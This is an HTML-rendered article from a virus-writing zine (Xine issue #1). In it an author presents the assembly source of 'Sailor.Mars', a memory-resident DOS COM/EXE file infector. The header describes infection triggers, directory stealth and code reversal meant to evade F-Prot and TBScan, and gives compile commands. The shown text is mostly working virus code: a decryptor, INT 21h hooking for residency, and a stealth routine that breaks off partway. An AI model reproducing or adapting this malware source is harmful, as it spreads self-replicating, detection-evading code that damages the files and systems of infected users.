<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>XINE-1.021</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #1 - Phile 021 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                          b0z0 of da iKx presents</span><span class="sc0">
</span><span class="sc1">;                                Sailor.Mars</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Dear reader :)</span><span class="sc0">
</span><span class="sc1">; here is my latest (in this moment) production. The third component of the</span><span class="sc0">
</span><span class="sc1">; Pretty Soldiers Sailor family is before your eyes! Sailor.Mars!</span><span class="sc0">
</span><span class="sc1">; enought of this... let's see what it is:</span><span class="sc0">
</span><span class="sc1">;     * TSR (of coz) COM/EXE infector</span><span class="sc0">
</span><span class="sc1">;     * infects on 4bh (execute), 56h (move/rename) and 43h (get/set</span><span class="sc0">
</span><span class="sc1">;       file attributes)</span><span class="sc0">
</span><span class="sc1">;     * stealth on dir (11h/12h), disabled when chkdsk is run</span><span class="sc0">
</span><span class="sc1">;     * int24h handler</span><span class="sc0">
</span><span class="sc1">;     * "encrypted" code: this is quite funny... the virus will run around</span><span class="sc0">
</span><span class="sc1">;       various hard disks reversed... after a short decryptor you will find</span><span class="sc0">
</span><span class="sc1">;       the end of the virus and at the end of the file the head :) this</span><span class="sc0">
</span><span class="sc1">;       seems quite fool, but is currently a good way to fool fprot and tbscan</span><span class="sc0">
</span><span class="sc1">;       scanning! :) when reversing code the routine also tests if there</span><span class="sc0">
</span><span class="sc1">;       occours any Interrupt (well, that are so much of that CDs ;) ) and</span><span class="sc0">
</span><span class="sc1">;       doesn't reverse it. In this manner the AVs will find a 'INT 21h',</span><span class="sc0">
</span><span class="sc1">;       but won't be able to find something interesting (like a mov into the</span><span class="sc0">
</span><span class="sc1">;       AX of some dangerous call) in the useful registers :) To prevent also</span><span class="sc0">
</span><span class="sc1">;       the generation of a 'INT 26h' call (which get flagged) the routine</span><span class="sc0">
</span><span class="sc1">;       also changes the '26h' before any 'CDh' to a more friendly '62h' ;)</span><span class="sc0">
</span><span class="sc1">;     * it doesn't infect a big number of antiviruses</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To compile</span><span class="sc0">
</span><span class="sc1">;  TASM /M2 MARS.ASM</span><span class="sc0">
</span><span class="sc1">;  TLINK MARS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">mars</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mars</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">mars</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">mars</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">exe_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">realstart</span><span class="sc0">
</span><span class="sc5">realstart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;save on stack for later use</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">;bp&lt;-delta offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;antiheuristic calculation of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;delta offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">realstart</span><span class="sc0">     </span><span class="sc1">;bye fprot &amp; tbscan :)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">movdidl</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">88h</span><span class="sc0">   </span><span class="sc1">;first gen?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_enc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deccom</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exe_enc</span><span class="sc0">
</span><span class="sc5">deccom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">movdidl</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;reput the mov [di],dl</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">virus_end</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">enc_end</span><span class="sc4">-</span><span class="sc5">enc_start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">enc_end</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;to</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;let's go</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">                 </span><span class="sc1">;remember out int masquerade</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nint</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0cdh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc0">                 </span><span class="sc1">;62-&gt;26 to fool abs disk write</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nint</span><span class="sc0">                    </span><span class="sc1">;alarm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
</span><span class="sc5">nint</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">movdidl</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">                 </span><span class="sc1">;will change to fool enc flag</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">enc_start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">virus_end</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">enc_end</span><span class="sc4">-</span><span class="sc5">enc_start</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                </span><span class="sc1">;put the code in it's real place</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">virusname</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'Sailor.Mars'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">author</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-b0z0/iKx-'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;as usual :)</span><span class="sc0">
</span><span class="sc1">;firstg          db      00h</span><span class="sc0">
</span><span class="sc5">enc_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exe_enc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">movdidl</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decvicdata</span><span class="sc0">              </span><span class="sc1">;decrypt original victim bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">resident</span><span class="sc0">                </span><span class="sc1">;go resident</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">isexe</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">;com or exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">realcom</span><span class="sc0">
</span><span class="sc1">;.exe restore</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infcs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infsp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;restore sp:ss</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infss</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infcs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;push cs:ip</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">                </span><span class="sc1">;return on original cs:ip</span><span class="sc0">
</span><span class="sc5">victim_enc_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">infip</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">infsp</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">infss</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">infcs</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
</span><span class="sc5">old_jump</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">isexe</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">;00h=exe, 01=com</span><span class="sc0">

</span><span class="sc5">new_jump</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0">
</span><span class="sc1">;.com restore</span><span class="sc0">
</span><span class="sc5">realcom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">old_jump</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;put original 2 words</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;jump at cs:100</span><span class="sc0">
</span><span class="sc5">resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02abch</span><span class="sc0">                  </span><span class="sc1">;installation check</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0def6h</span><span class="sc0">                  </span><span class="sc1">; HEX DEF6</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">notinst</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; get int 21 adress</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int21_off</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;store int21 offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int21_seg</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">; and segment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; es=psp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; psp-1=mcb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DS = segment of programs mcb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">l4mcb</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; look for last mcb in chain</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">;is last?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">last</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l4mcb</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">size_para</span><span class="sc0">  </span><span class="sc1">; =mcb+03h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">size_para</span><span class="sc0">  </span><span class="sc1">; =psp+02h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = first usable MCB segment</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; ds points on code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; es points on our usable segment</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">exe_start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; si points on our code</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; move virus</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; virus segment</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">            </span><span class="sc1">; set interrupt 21h handler</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; point to virus segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_handler</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">movdidl</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">notinst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">dirstealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">goint21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;ok?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">leave_dir</span><span class="sc0">                 </span><span class="sc1">;no?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_ext</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">

</span><span class="sc5">no_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;seconds field</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                    </span><span class="sc1">;is file infected?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">error</span><span class="sc0">
</span><span class="sc5">hide</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;hide size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
